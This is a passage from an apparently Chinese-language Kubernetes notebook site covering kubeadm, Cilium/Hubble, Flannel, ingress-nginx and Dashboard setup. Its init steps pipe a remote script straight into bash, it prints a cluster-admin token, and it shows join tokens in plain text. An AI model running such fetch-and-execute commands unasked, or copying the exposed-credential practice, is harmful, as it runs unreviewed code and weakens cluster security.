quay.io/cilium/hubble-ui:v0.9.1@sha256:baff611b975cb12307a163c0e547e648da211384eabdafd327707ff2ec31cc24: 1\n                  hubble-ui          quay.io/cilium/hubble-ui-backend:v0.9.1@sha256:c4b86e0d7a38d52c6ea3d9d7b17809e5212efd97494e8bd37c8466ddd68d42d0: 1\n\nroot@K-LAB-K8S-MASTER-01:~# kubectl -n kube-system get all\nNAME                                                READY   STATUS    RESTARTS   AGE\npod/cilium-dwq2w                                    1/1     Running   0          137m\npod/cilium-hlwl6                                    1/1     Running   0          137m\npod/cilium-operator-69b677f97c-ktj47                1/1     Running   0          4h\npod/cilium-t2nwf                                    1/1     Running   0          137m\npod/cilium-tnlbb                                    1/1     Running   0          137m\npod/coredns-b55fcbd7b-ntjg6                         1/1     Running   0          4h16m\npod/coredns-b55fcbd7b-rktpx                         1/1     Running   0          4h16m\npod/etcd-gat-lab-k8s-master-01                      1/1     Running   1          4h16m\npod/etcd-gat-lab-k8s-master-02                      1/1     Running   0          4h15m\npod/etcd-gat-lab-k8s-master-03                      1/1     Running   0          4h14m\npod/hubble-relay-59d8575-hpbl7                      1/1     Running   0          3h18m\npod/hubble-ui-64d4995d57-n7bpq                      2/2     Running   0          136m\npod/kube-apiserver-gat-lab-k8s-master-01            1/1     Running   1          4h16m\npod/kube-apiserver-gat-lab-k8s-master-02            1/1     Running   0          4h15m\npod/kube-apiserver-gat-lab-k8s-master-03            1/1     Running   0          4h14m\npod/kube-controller-manager-gat-lab-k8s-master-01   1/1     Running   1          4h16m\npod/kube-controller-manager-gat-lab-k8s-master-02   1/1     Running   0          4h14m\npod/kube-controller-manager-gat-lab-k8s-master-03   1/1     Running   0          4h14m\npod/kube-proxy-5652c                                1/1     Running   0          4h14m\npod/kube-proxy-bdqfv                                1/1     Running   0          4h16m\npod/kube-proxy-mhtlj                                1/1     Running   0          4h13m\npod/kube-proxy-qtdhk                                1/1     Running   0          4h15m\npod/kube-scheduler-gat-lab-k8s-master-01            1/1     Running   1          4h16m\npod/kube-scheduler-gat-lab-k8s-master-02            1/1     Running   0          4h15m\npod/kube-scheduler-gat-lab-k8s-master-03            1/1     Running   0          4h14m\n\nNAME                   TYPE        CLUSTER-IP        EXTERNAL-IP   PORT(S)                  AGE\nservice/hubble-peer    ClusterIP   192.168.97.223    &lt;none&gt;        443/TCP                  136m\nservice/hubble-relay   ClusterIP   192.168.180.202   &lt;none&gt;        80/TCP                   3h18m\nservice/hubble-ui      ClusterIP   192.168.23.235    &lt;none&gt;        80/TCP                   136m\nservice/kube-dns       ClusterIP   192.168.0.10      &lt;none&gt;        53/UDP,53/TCP,9153/TCP   4h16m\n\nNAME                        DESIRED   CURRENT   READY   UP-TO-DATE   AVAILABLE   NODE SELECTOR            AGE\ndaemonset.apps/cilium       4         4         4       4            4           kubernetes.io/os=linux   4h\ndaemonset.apps/kube-proxy   4         4         4       4            4           kubernetes.io/os=linux   4h16m\n\nNAME                              READY   UP-TO-DATE   AVAILABLE   AGE\ndeployment.apps/cilium-operator   1/1     1            1           4h\ndeployment.apps/coredns           2/2     2            2           4h16m\ndeployment.apps/hubble-relay      1/1     1            1           3h18m\ndeployment.apps/hubble-ui         1/1     1            1           136m\n\nNAME                                         DESIRED   CURRENT   READY   AGE\nreplicaset.apps/cilium-operator-69b677f97c   1         1         1       4h\nreplicaset.apps/coredns-b55fcbd7b            2         2         2       4h16m\nreplicaset.apps/hubble-relay-59d8575         1         1         1       3h18m\nreplicaset.apps/hubble-ui-64d4995d57         1         1         1       136m\n</code></pre> <p>Hubble UI</p> <p></p>"},{"location":"kubernetes/01-cluster-init-cilium/#32-helm","title":"3.2 Helm \u5b89\u88c5","text":"<pre><code>helm repo add cilium https://helm.cilium.io/\nhelm repo update cilium\nhelm search repo cilium\nhelm show values cilium/cilium &gt; cilium.yaml-v1.12.1-default\n\n#\n# e.g. https://books.8ops.top/attachment/kubernetes/helm/cilium.yaml-v1.12.1\n#\n\n# vim cilium.yaml\nhelm install cilium cilium/cilium \\\n  -f cilium.yaml-v1.12.1 \\\n  --namespace=kube-system \\\n  --version 1.12.1 \\\n  --debug\n\nhelm -n kube-system uninstall cilium  \n</code></pre> <p>edit cilium.yaml-v1.12.1</p> <pre><code>image:\n  repository: \"hub.8ops.top/google_containers/cilium\"\n  tag: \"v1.12.1\"\n  useDigest: false\n\nresources:\n  limits:\n    cpu: 4\n    memory: 4Gi\n  requests:\n    cpu: 100m\n    memory: 512Mi\n\ncertgen:\n  image:\n    repository: \"hub.8ops.top/google_containers/certgen\"\n    tag: \"v0.1.8\"\n    useDigest: false\n\nhubble:\n  enabled: true\n  relay:\n    enabled: true\n    image:\n      repository: \"hub.8ops.top/google_containers/hubble-relay\"\n      tag: \"v1.12.1\"\n      useDigest: false\n\n    resources:\n      limits:\n        cpu: 2\n        memory: 2Gi\n      requests:\n        cpu: 100m\n        memory: 128Mi\n\n    prometheus:\n      enabled: true\n      port: 9966\n\n  ui:\n    enabled: true\n    standalone:\n      enabled: true\n\n    backend:\n      image:\n        repository: \"hub.8ops.top/google_containers/hubble-ui-backend\"\n        tag: \"v0.9.1\"\n        useDigest: false\n\n      resources:\n        limits:\n          cpu: 1\n          memory: 1Gi\n        requests:\n          cpu: 100m\n          memory: 64Mi\n\n    frontend:\n      image:\n        repository: \"hub.8ops.top/google_containers/hubble-ui\"\n        tag: \"v0.9.1\"\n        useDigest: false\n\n      resources:\n        limits:\n          cpu: 1\n          memory: 1Gi\n        requests:\n          cpu: 100m\n          memory: 64Mi\n\n    ingress:\n      enabled: true\n      className: \"external\"\n      hosts:\n        - hubble.8ops.top\n      tls:\n        - secretName: tls-8ops.top\n          hosts:\n            - hubble.8ops.top\n\nipam:\n  mode: \"cluster-pool\"\n  operator:\n    clusterPoolIPv4PodCIDR: \"172.20.0.0/16\"\n    clusterPoolIPv4MaskSize: 24\n\nprometheus:\n  enabled: true\n  port: 9962\n\noperator:\n  enabled: true\n  image:\n    repository: \"hub.8ops.top/google_containers/cilium-operator\"\n    tag: \"v1.12.1\"\n    useDigest: false\n\n  resources:\n    limits:\n      cpu: 1\n      memory: 1Gi\n    requests:\n      cpu: 100m\n      memory: 128Mi\n\n  prometheus:\n    enabled: true\n    port: 9963\n</code></pre>"},{"location":"kubernetes/01-cluster-init-flannel/","title":"Quick Start - Flannel","text":"<p>Reference</p> <p>\u5f53\u524d\u5404\u8f6f\u4ef6\u7248\u672c</p> \u540d\u79f0 \u7248\u672c ubuntu v22.04 kubernetes v1.25.0 flannel v0.19.1 <ul> <li>\u8fd9\u91cc\u64cd\u4f5c\u7cfb\u7edf\u9009\u62e9 <code>20.04</code></li> </ul>"},{"location":"kubernetes/01-cluster-init-flannel/#_1","title":"\u4e00\u3001\u51c6\u5907\u8d44\u6e90","text":""},{"location":"kubernetes/01-cluster-init-flannel/#11-vip","title":"1.1 VIP","text":"<p>\u901a\u8fc7 <code>haproxy</code> \u4ee3\u7406 <code>apiserver</code> \u591a\u8282\u70b9</p> <p>10.101.9.111</p>"},{"location":"kubernetes/01-cluster-init-flannel/#12","title":"1.2 \u670d\u52a1\u5668","text":"\u89d2\u8272 \u670d\u52a1\u5668\u5730\u5740 control-plane 10.101.9.183 control-plane 10.101.9.53 control-plane 10.101.9.79 work-node 10.101.9.37 work-node 10.101.9.1 work-node 10.101.9.38"},{"location":"kubernetes/01-cluster-init-flannel/#_2","title":"\u4e8c\u3001\u642d\u5efa\u96c6\u7fa4","text":"<p>Reference</p> <p>pull repo </p> <pre><code>{\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/kube-apiserver:v1.25.0\":\"hub.8ops.top/google_containers/kube-apiserver\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/kube-controller-manager:v1.25.0\":\"hub.8ops.top/google_containers/kube-controller-manager\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/kube-scheduler:v1.25.0\":\"hub.8ops.top/google_containers/kube-scheduler\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/kube-proxy:v1.25.0\":\"hub.8ops.top/google_containers/kube-proxy\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/pause:3.8\":\"hub.8ops.top/google_containers/pause\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/etcd:3.5.4-0\":\"hub.8ops.top/google_containers/etcd\",\n  \"registry.cn-hangzhou.aliyuncs.com/google_containers/coredns:v1.9.3\":\"hub.8ops.top/google_containers/coredns\"\n}\n</code></pre>"},{"location":"kubernetes/01-cluster-init-flannel/#21","title":"2.1 \u521d\u59cb\u5316\u73af\u5883","text":"<pre><code>curl -s https://books.8ops.top/attachment/kubernetes/bin/01-init.sh | bash\n</code></pre>"},{"location":"kubernetes/01-cluster-init-flannel/#22-lib","title":"2.2 \u8c03\u6574lib\u76ee\u5f55","text":"<pre><code># containerd\nmkdir -p /data1/lib/containerd &amp;&amp; \\\n    ([ -e /var/lib/containerd ] &amp;&amp; mv /var/lib/containerd{,-$(date +%Y%m%d)} || /bin/true) &amp;&amp; \\\n    ln -s /data1/lib/containerd /var/lib/containerd\nls -l /var/lib/containerd\n\n# kubelet\nmkdir -p /data1/lib/kubelet &amp;&amp; \\\n    ([ -e /var/lib/kubelet ] &amp;&amp; mv /var/lib/kubelet{,-$(date +%Y%m%d)} || /bin/true) &amp;&amp; \\\n    ln -s /data1/lib/kubelet /var/lib/kubelet\nls -l /var/lib/kubelet   \n\n# etcd\uff08\u4ec5\u9700\u8981\u5728 control-plane\uff09\nmkdir -p /data1/lib/etcd &amp;&amp; \\\n    ([ -e /var/lib/etcd ] &amp;&amp; mv /var/lib/etcd{,-$(date +%Y%m%d)} || /bin/true) &amp;&amp; \\\n    ln -s /data1/lib/etcd /var/lib/etcd\nls -l /var/lib/etcd\n</code></pre>"},{"location":"kubernetes/01-cluster-init-flannel/#23","title":"2.3 \u5b89\u88c5\u5bb9\u5668\u8fd0\u884c\u65f6","text":"<pre><code>CONTAINERD_VERSION=1.5.9-0ubuntu1~20.04.4\napt install -y containerd=${CONTAINERD_VERSION}\n\napt-mark hold containerd\napt-mark showhold\ndpkg -l | grep containerd\n\n# \u66ff\u6362 ctr \u8fd0\u884c\u65f6\nmkdir -p /etc/containerd\ncontainerd config default &gt; /etc/containerd/config.toml-default\ncp /etc/containerd/config.toml-default /etc/containerd/config.toml\n\nsed -i 's#sandbox_image.*$#sandbox_image = \"hub.8ops.top/google_containers/pause:3.6\"#' /etc/containerd/config.toml  \nsed -i 's#SystemdCgroup = false#SystemdCgroup = true#' /etc/containerd/config.toml \ngrep -P 'sandbox_image|SystemdCgroup' /etc/containerd/config.toml  \nsystemctl restart containerd\nsystemctl status containerd\n</code></pre>"},{"location":"kubernetes/01-cluster-init-flannel/#24-kube","title":"2.4 \u5b89\u88c5 kube \u73af\u5883","text":"<pre><code># kubeadm\nKUBERNETES_VERSION=1.25.0-00\napt install -y -q kubeadm=${KUBERNETES_VERSION} kubectl=${KUBERNETES_VERSION} kubelet=${KUBERNETES_VERSION}\n\napt-mark hold kubeadm kubectl kubelet\napt-mark showhold\ndpkg -l | grep kube\n\n# \u7528\u4e8e\u8fd0\u884c crictl\ncat &gt; /etc/crictl.yaml &lt;&lt;EOF\nruntime-endpoint: unix:///run/containerd/containerd.sock\nimage-endpoint: unix:///run/containerd/containerd.sock\ntimeout: 10\ndebug: false\nEOF\n\nsystemctl restart containerd\ncrictl images\ncrictl ps -a\n\n# \u521d\u59cb\u96c6\u7fa4\uff08\u4ec5\u9700\u8981\u5728\u5176\u4e2d\u4e00\u53f0 control-plane \u8282\u70b9\u64cd\u4f5c\uff09\n# config\nkubeadm config print init-defaults &gt; kubeadm-init.yaml-default\n\nkubeadm config images list\nkubeadm config images list --config kubeadm-init.yaml\nkubeadm config images pull --config kubeadm-init.yaml\n\nkubeadm init --config kubeadm-init.yaml --upload-certs\n\nmkdir -p ~/.kube &amp;&amp; ln -s /etc/kubernetes/admin.conf ~/.kube/config \n\n# \u6dfb\u52a0\u8282\u70b9 control-plane\nkubeadm join 10.101.9.111:6443 --token abcdef.0123456789abcdef \\\n    --discovery-token-ca-cert-hash sha256:b214dc5d30387ad52c40bcd6ffa0e4bc29d15b488752af6a6ee66996914b8659 \\\n    --control-plane --certificate-key 629a5accb4cb5f839c004c07658d8fc275fb4145fc1fe44b2011249ac2fc4d83\n\n# \u6dfb\u52a0\u8282\u70b9 work-node\nkubeadm join 10.101.9.111:6443 --token abcdef.0123456789abcdef \\\n    --discovery-token-ca-cert-hash sha256:b214dc5d30387ad52c40bcd6ffa0e4bc29d15b488752af6a6ee66996914b8659    \n</code></pre> <p>\u7f16\u8f91 kubeadm-init.yaml</p> <pre><code>apiVersion: kubeadm.k8s.io/v1beta3\nbootstrapTokens:\n- groups:\n  - system:bootstrappers:kubeadm:default-node-token\n  token: abcdef.0123456789abcdef\n  ttl: 24h0m0s\n  usages:\n  - signing\n  - authentication\nkind: InitConfiguration\nlocalAPIEndpoint:\n  advertiseAddress: 10.101.9.183\n  bindPort: 6443\nnodeRegistration:\n  criSocket: unix:///var/run/containerd/containerd.sock\n  imagePullPolicy: IfNotPresent\n  name: K-LAB-K8S-MASTER-01\n  taints: null\n---\napiServer:\n  timeoutForControlPlane: 4m0s\napiVersion: kubeadm.k8s.io/v1beta3\ncertificatesDir: /etc/kubernetes/pki\nclusterName: kubernetes\ncontrollerManager: {}\ndns:\n  imageRepository: hub.8ops.top/google_containers\n  imageTag: v1.9.3\netcd:\n  local:\n    dataDir: /var/lib/etcd\nimageRepository: hub.8ops.top/google_containers\nkind: ClusterConfiguration\nkubernetesVersion: 1.25.0\ncontrolPlaneEndpoint: 10.101.9.111:6443\nnetworking:\n  dnsDomain: cluster.local\n  podSubnet: 172.20.0.0/16\n  serviceSubnet: 192.168.0.0/16\nscheduler: {}\n---\napiVersion: kubelet.config.k8s.io/v1beta1\nkind: KubeletConfiguration\ncgroupDriver: systemd\n---\napiVersion: kubeproxy.config.k8s.io/v1alpha1\nkind: KubeProxyConfiguration\nmode: ipvs\n</code></pre>"},{"location":"kubernetes/01-cluster-init-flannel/#25","title":"2.5 \u4f18\u5316\u914d\u7f6e","text":"<p>optional</p> <pre><code># kubelet\nkubectl -n kube-system edit cm kubelet-config\n\u2026\u2026\n    # GC\n    imageGCLowThresholdPercent: 40\n    imageGCHighThresholdPercent: 50\n    # Resource\n    systemReserved:\n      cpu: 500m\n      memory: 500m\n    kubeReserved:\n      cpu: 500m\n      memory: 500m\n    evictionPressureTransitionPeriod: 300s # upgrade\n    nodeStatusReportFrequency: 10s         # upgrade\n    nodeStatusUpdateFrequency: 10s         # upgrade\n    cgroupDriver: systemd\n    maxPods: 200\n    resolvConf: /etc/resolv.conf\nkind: ConfigMap                            # relative\n\u2026\u2026\n\n# kube-proxy \n# \u5f53flannel\u91c7\u7528host-gw\u65f6\uff0c\u9700\u8981\u5f00\u542fipvs\nkubectl -n kube-system edit cm kube-proxy\n\n\u2026\u2026\n    configSyncPeriod: 5s # upgrade\n    mode: \"ipvs\"         # upgrade\n    ipvs:                # relative\n      tcpTimeout: 900s   # upgrade\n      syncPeriod: 5s     # upgrade\n      minSyncPeriod: 5s  # upgrade\n\u2026\u2026\n</code></pre>"},{"location":"kubernetes/01-cluster-init-flannel/#flannel","title":"\u4e09\u3001\u5e94\u7528 Flannel","text":"<pre><code>#\n# Example\n#   https://books.8ops.top/attachment/kubernetes/kube-flannel.yaml-v0.19.1\n#\n\nkubectl apply -f kube-flannel.yaml\n</code></pre> <p>\u7f16\u8f91\u914d\u7f6e</p> <pre><code>\u2026\u2026\n  net-conf.json: | # relative\n    {\n      \"Network\": \"172.20.0.0/16\",\n      \"Backend\": {\n        \"Type\": \"host-gw\"\n      }\n    }\n\u2026\u2026\n    # \u955c\u50cf\u66ff\u6362\u4e3a\u79c1\u6709\u5730\u5740\n      initContainers:\n      - name: install-cni-plugin\n        image: hub.8ops.top/google_containers/flannel-cni-plugin:v1.1.0\n        \u2026\u2026\n      - name: install-cni\n        image: hub.8ops.top/google_containers/flannel:v0.19.1\n        \u2026\u2026\n      containers:\n      - name: kube-flannel\n        image: hub.8ops.top/google_containers/flannel:v0.19.1\n</code></pre>"},{"location":"kubernetes/01-cluster-init-flannel/#addon","title":"\u56db\u3001Addon","text":""},{"location":"kubernetes/01-cluster-init-flannel/#41-ingress-nginx","title":"4.1 Ingress-Nginx","text":"<pre><code>helm repo add ingress-nginx https://kubernetes.github.io/ingress-nginx\nhelm repo update\nhelm search repo ingress-nginx\nhelm show values ingress-nginx/ingress-nginx &gt; ingress-nginx.yaml-v4.2.3-default\n\n# external\n# vim ingress-nginx-external.yaml-v4.2.3\n# e.g. https://books.8ops.top/attachment/kubernetes/helm/ingress-nginx-external.yaml-v4.2.3\n#\nkubectl label node gat-gslab-k8s-node-01 edge=external\nhelm install ingress-nginx-external-controller ingress-nginx/ingress-nginx \\\n    -f ingress-nginx-external.yaml-v4.2.3 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 4.2.3\n\nhelm upgrade --install ingress-nginx-external-controller ingress-nginx/ingress-nginx \\\n    -f ingress-nginx-external.yaml-v4.2.3 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 4.2.3\n\n# intrnal\n# vim ingress-nginx-internal.yaml-v4.2.3\n# e.g. https://books.8ops.top/attachment/kubernetes/helm/ingress-nginx-internal.yaml-v4.2.3\n#\nkubectl label node gat-gslab-k8s-node-02 edge=internal\nhelm install ingress-nginx-internal-controller ingress-nginx/ingress-nginx \\\n    -f ingress-nginx-internal.yaml-v4.2.3 \\\n    -n kube-server \\\n    --version 4.2.3\n</code></pre> <p>\u5207\u5272\u65e5\u5fd7</p> <pre><code># /etc/logrotate.d/nginx\n/var/log/nginx/access.log\n {\n    su systemd-resolve nginx-ingress\n    hourly\n    rotate 180\n    dateext\n    missingok\n    notifempty\n    compress\n    delaycompress\n    nomail\n    sharedscripts\n    postrotate\n        for pid in `/bin/pidof nginx `;do\n            kill -USR1 ${pid}\n        done\n    endscript\n}\n/var/log/nginx/error.log\n {\n    su systemd-resolve nginx-ingress\n    daily\n    rotate 7\n    dateext\n    missingok\n    notifempty\n    compress\n    delaycompress\n    nomail\n    sharedscripts\n    postrotate\n        for pid in `/bin/pidof nginx `;do\n            kill -USR1 ${pid}\n        done\n    endscript\n}\n\n# \u786e\u4fdduid=101,gid=82\u7684\u7528\u6237\u548c\u7ec4\u5b58\u5728\ngroupadd -g 82 nginx-ingress\ncd /data1/log/nginx\n\nchown 101.82 * &amp;&amp; ls -l \n\nsystemctl start logrotate &amp;&amp; ls -l &amp;&amp; sleep 5 &amp;&amp; systemctl status logrotate\n\n# \u8c03\u6574\u5b9a\u65f6\u5668\u4e3a\u5c0f\u65f6\nsed -i 's/OnCalendar=daily/OnCalendar=hourly/' /lib/systemd/system/logrotate.timer\nsystemctl daemon-reload &amp;&amp; sleep 5 &amp;&amp; systemctl status logrotate.timer\n</code></pre>"},{"location":"kubernetes/01-cluster-init-flannel/#42-dashboard","title":"4.2 Dashboard","text":"<pre><code>helm repo add kubernetes-dashboard https://kubernetes.github.io/dashboard/\nhelm repo update\nhelm search repo kubernetes-dashboard\nhelm show values kubernetes-dashboard/kubernetes-dashboard &gt; kubernetes-dashboard.yaml-v5.10.0-default\n\n# vim kubernetes-dashboard.yaml-v5.10.0\n# e.g. https://books.8ops.top/attachment/kubernetes/helm/kubernetes-dashboard.yaml-v5.10.0\n# \n\nhelm install kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard \\\n    -f kubernetes-dashboard.yaml-v5.10.0 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 5.10.0\n\nhelm upgrade --install kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard \\\n    -f kubernetes-dashboard.yaml-v5.10.0 \\\n    -n kube-server \\\n    --create-namespace \\\n    --version 5.10.0\n\n# create sa for guest\nkubectl create serviceaccount dashboard-guest -n kube-server\n\n# binding clusterrole\nkubectl create clusterrolebinding dashboard-guest \\\n  --clusterrole=view \\\n  --serviceaccount=kube-server:dashboard-guest\n\n# create token\n# kubernetes v1.24.0+ newst \u9700\u8981\u4e3b\u52a8\u521b\u5efa secret\nkubectl apply -f - &lt;&lt;EOF\napiVersion: v1\nkind: Secret\nmetadata:\n  name: dashboard-guest-secret\n  namespace: kube-server\n  annotations:\n    kubernetes.io/service-account.name: dashboard-guest\ntype: kubernetes.io/service-account-token\nEOF\n\n# output token\nkubectl -n kube-server describe secrets dashboard-guest-secret\n# \n# kubectl -n kube-server get secrets dashboard-guest-secret -o=jsonpath={.data.token} | \\\n#   base64 -d\n#\n# kubectl describe secrets \\\n#   -n kube-server $(kubectl -n kube-server get secret | awk '/dashboard-guest/{print $1}')\n\n#----\n# create sa for ops\nkubectl create serviceaccount dashboard-ops -n kube-server\n\n# binding clusterrole\nkubectl create clusterrolebinding dashboard-ops \\\n  --clusterrole=cluster-admin \\\n  --serviceaccount=kube-server:dashboard-ops\n\n# create token\nkubectl apply -f - &lt;&lt;EOF\napiVersion: v1\nkind: Secret\nmetadata:\n  name: dashboard-ops-secret\n  namespace: kube-server\n  annotations:\n    kubernetes.io/service-account.name: dashboard-ops\ntype: kubernetes.io/service-account-token\nEOF\n\n# output token\nkubectl -n kube-server describe secrets dashboard-ops-secret\n</code></pre>"},{"location":"kubernetes/01-cluster-init/","title":"Quick Start","text":"<p><code>Kubernetes</code> \u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u5bb9\u5668\u7f16\u6392\u5f15\u64ce\uff0c\u7528\u6765\u5bf9\u5bb9\u5668\u5316\u5e94\u7528\u8fdb\u884c\u81ea\u52a8\u5316\u90e8\u7f72\u3001 \u6269\u7f29\u548c\u7ba1\u7406\u3002</p> <p>\u4ece <code>CNCF</code> \u6bd5\u4e1a\uff0c<code>Kubernetes</code> \u662f\u5f53\u4e0b\u6700\u706b\u70ed\u7684\u6280\u672f\u5404\u5927\u4e2d\u5c0f\u4e92\u8054\u7f51\u516c\u53f8\u90fd\u5728\u79ef\u6781\u63a8\u8fdb\u4ed6\u7684\u843d\u5730\u3002</p> <p>\u63a5\u4e0b\u6765\u8ddf\u7740\u6211\u7684\u7b14\u8bb0\u4e00\u6b65\u4e00\u6b65\u64cd\u4f5c\u7b80\u5355\u5feb\u901f\u642d\u5efa kubernetes cluster\u5427\u3002</p>"},{"location":"kubernetes/01-cluster-init/#_1","title":"\u4e00\u3001\u80cc\u666f\u63cf\u8ff0","text":"<p>\u91c7\u7528 kubeadm \u65b9\u5f0f\u5b89\u88c5</p> <p></p>"},{"location":"kubernetes/01-cluster-init/#11","title":"1.1 \u673a\u5668\u51c6\u5907","text":"<p>VIP\uff1a<code>10.101.11.110</code>\uff0c\u7528\u4e8e\u89e3\u51b3apiserver\u7684\u9ad8\u53ef\u7528\u5747\u8861\u8d1f\u8f7d\u5230 3 \u53f0 master \u8282\u70b9\u3002</p> \u4e3b\u673a\u540d\u79f0 \u4e3b\u673aIP \u64cd\u4f5c\u7cfb\u7edf \u89d2\u8272\u5206\u914d K-KUBE-LAB-01 10.101.11.240 Ubuntu 20.04.2 LTS control-plane,master K-KUBE-LAB-02 10.101.11.114 Ubuntu 20.04.2 LTS control-plane,master K-KUBE-LAB-03 10.101.11.154 Ubuntu 20.04.2 LTS control-plane,master K-KUBE-LAB-08 10.101.11.196 Ubuntu 20.04.2 LTS node K-KUBE-LAB-11 10.101.11.157 Ubuntu 20.04.2 LTS node K-KUBE-LAB-12 10.101.11.250 Ubuntu 20.04.2 LTS node <p>\u673a\u5668\u53c2\u8003\u5b98\u65b9\u6700\u5c0f\u914d\u7f6e\u6307\u5bfc\uff0c\u91c7\u7528**2**\u6838CPU/**8**G\u5185\u5b58/**100**G\u78c1\u76d8\uff0c\u79c1\u6709\u5316\u865a\u62df\u673a\u90e8\u7f72\u3002</p>"},{"location":"kubernetes/01-cluster-init/#12","title":"1.2 \u8f6f\u4ef6\u7248\u672c","text":"<p>\u5339\u914d\u7248\u672c</p> \u8f6f\u4ef6\u540d\u79f0 \u5f53\u524d\u6700\u65b0\u7248\u672c kubeadm 1.23.0-00 kubelet 1.23.0-00 kubernetes 1.23.0-00 etcd v3.5.1 flannel v0.15.1 coredns 1.8.6 containerd 1.5.5-0ubuntu3~20.04.2 <p>Reference</p> <ul> <li>kubeadm</li> <li>kubernetes</li> <li>etcd </li> <li>cni</li> <li>containerd</li> <li>flannel</li> <li>coredns</li> <li>dashboard</li> </ul>"},{"location":"kubernetes/01-cluster-init/#13","title":"1.3 \u90e8\u7f72\u67b6\u6784","text":"<p>\u90e8\u7f72\u62d3\u6251</p> <p></p> <p>\u90e8\u7f72\u5957\u4ef6</p> \u6240\u5c5e\u8303\u7574 \u7ec4\u4ef6\u540d\u79f0 \u90e8\u7f72\u65b9\u5f0f \u8fd0\u884c\u65b9\u5f0f \u63a7\u5236\u5e73\u9762/Node\u8282\u70b9 kubelet systemd binary \u63a7\u5236\u5e73\u9762 etcd kubeadm static pod \u63a7\u5236\u5e73\u9762 kube-apiserver kubeadm static pod \u63a7\u5236\u5e73\u9762 kube-controller-manager kubeadm static pod \u63a7\u5236\u5e73\u9762 kube-scheduler kubeadm static pod \u63a7\u5236\u5e73\u9762/Node\u8282\u70b9 kube-proxy kubeadm daemonset \u63a7\u5236\u5e73\u9762/Node\u8282\u70b9 kube-flannel kubectl daemonset Node\u8282\u70b9 kube-coredns kubeadm deployment Node\u8282\u70b9 kube-dahboard helm deployment Node\u8282\u70b9 ingress-nginx-controller helm deployment Node\u8282\u70b9 prometheus helm deployment Node\u8282\u70b9 alertmanager helm deployment"},{"location":"kubernetes/01-cluster-init/#14","title":"1.4 \u73af\u5883\u8bf4\u660e","text":"<ul> <li>\u56fd\u5185\u79c1\u6709\u4e91\u7f51\u7edc\u73af\u5883</li> <li>\u955c\u50cf\u63d0\u524d\u4e0b\u8f7d\u5230\u79c1\u6709\u73af\u5883harbor\uff08\u53ef\u4ee5\u4ece\u963f\u91cc\u4e91\u955c\u50cf\u4e2d\u8f6c\u4e0b\u8f7d\uff09\u52a0\u901f\u8bbf\u95ee\u955c\u50cf</li> </ul>"},{"location":"kubernetes/01-cluster-init/#_2","title":"\u4e8c\u3001\u524d\u671f\u51c6\u5907","text":"<p>\u8fdb\u884c\u5fc5\u8981\u7684\u64cd\u4f5c\u8ba9\u6bcf\u4e2a\u8282\u70b9\u7b26\u5408 kubernetes \u5b89\u88c5\u7684\u8981\u6c42</p>"},{"location":"kubernetes/01-cluster-init/#21","title":"2.1 \u4e00\u952e\u4f18\u5316","text":"<p>\u4f18\u5316\u5185\u5bb9\u5305\u62ec</p> <ol> <li>\u4f18\u5316\u6587\u4ef6\u6253\u5f00\u6570</li> <li>\u5173\u95edswap</li> <li>\u542f\u52a8\u5fc5\u8981\u6a21\u5757</li> <li>\u4f18\u5316\u5185\u6838</li> <li>\u4f18\u5316\u8f6f\u4ef6\u6e90</li> <li>\u5b89\u88c5\u5fc5\u8981\u8f6f\u4ef6</li> <li>kubectl \u7684 bash \u8865\u5168</li> </ol> <pre><code>curl -s https://books.8ops.top/attachment/kubernetes/bin/01-init.sh | bash\n</code></pre>"},{"location":"kubernetes/01-cluster-init/#22","title":"2.2 \u6570\u636e\u76ee\u5f55","text":"<p><code>/var/lib/containerd</code></p> <p>\u6765\u6e90\u4e8e\u914d\u7f6e\u6587\u4ef6 <code>/etc/containerd/config.toml</code></p> <p><code>/var/lib/containerd</code> \u9700\u8981\u6307\u5411\u5230\u78c1\u76d8\u7efc\u5408\u5c5e\u6027\u8f83\u597d\u7684\u4f4d\u7f6e</p> <ul> <li>\u5b58\u50a8\u7a7a\u95f4\u8db3\u591f\u5927</li> <li>IO\u8bfb\u5199\u6027\u80fd\u8f83\u597d</li> </ul> <pre><code>mkdir -p /data1/lib/containerd &amp;&amp; \\\n    ([ -e /var/lib/containerd ] &amp;&amp; mv /var/lib/containerd{,-$(date +%Y%m%d)} || /bin/true) &amp;&amp; \\\n    ln -s /data1/lib/containerd /var/lib/containerd\nls -l /var/lib/containerd\n</code></pre> <p><code>/var/lib/kubelet</code></p> <pre><code>mkdir -p /data1/lib/kubelet &amp;&amp; \\\n    ([ -e /var/lib/kubelet ] &amp;&amp; mv /var/lib/kubelet{,-$(date +%Y%m%d)} || /bin/true) &amp;&amp; \\\n    ln -s /data1/lib/kubelet /var/lib/kubelet\nls -l /var/lib/kubelet      \n</code></pre> <p><code>/var/lib/etcd</code></p> <p>\u6765\u6e90\u4e8e\u914d\u7f6e\u6587\u4ef6<code>/etc/kubernetes/manifests/etcd.yaml</code></p> <pre><code>mkdir -p /data1/lib/etcd &amp;&amp; \\\n    ([ -e /var/lib/etcd ] &amp;&amp; mv /var/lib/etcd{,-$(date +%Y%m%d)} || /bin/true) &amp;&amp; \\\n    ln -s /data1/lib/etcd /var/lib/etcd\nls -l /var/lib/etcd\n</code></pre>"},{"location":"kubernetes/01-cluster-init/#_3","title":"\u4e09\u3001\u5b9e\u65bd\u90e8\u7f72","text":""},{"location":"kubernetes/01-cluster-init/#31","title":"3.1 \u5bb9\u5668\u8fd0\u884c\u65f6","text":"<p>\u5728\u6240\u6709\u8282\u70b9\u9700\u8981\u6267\u884c\u7684\u64cd\u4f5c</p> <p>\u4f7f\u7528 containerd \u505a\u4e3a\u5bb9\u5668\u8fd0\u884c\u65f6</p> <pre><code># CONTAINERD_VERSION=1.5.5-0ubuntu3~20.04.2\nCONTAINERD_VERSION=1.6.12-0ubuntu1~20.04.1\napt install -y containerd=${CONTAINERD_VERSION}\n\napt-mark hold containerd\napt-mark showhold\ndpkg -l | grep containerd\n</code></pre> <p>Reference</p> <ul> 